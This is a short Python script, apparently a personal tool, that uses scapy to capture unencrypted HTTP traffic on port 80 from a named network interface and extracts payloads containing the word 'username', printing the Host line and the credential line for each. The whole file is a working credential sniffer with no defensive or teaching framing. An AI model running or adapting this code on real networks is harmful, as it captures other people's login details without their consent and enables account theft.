from scapy.all import *
import re

conf.verb = 0

tmp = open("tmp","w")
tmp.close

def pkt_callback(pkt):
    #pkt.show()
    if Raw in pkt:
        load = pkt[Raw].load
        if re.search('username', load):
            #print load
            tmp = open("tmp","r+")
            tmp.write(load)
            tmp.close
            tmp = open("tmp","r")
            for line in tmp:
                if re.search('Host', line):
                    print "---"
                    print "\n"
                    print line
                if re.search('username', line):
                    print line
                    print "\n"

sniff(iface= "Intel(R) Ethernet Connection (5) I219-LM", count = 0, prn=pkt_callback, filter="port 80 and tcp")
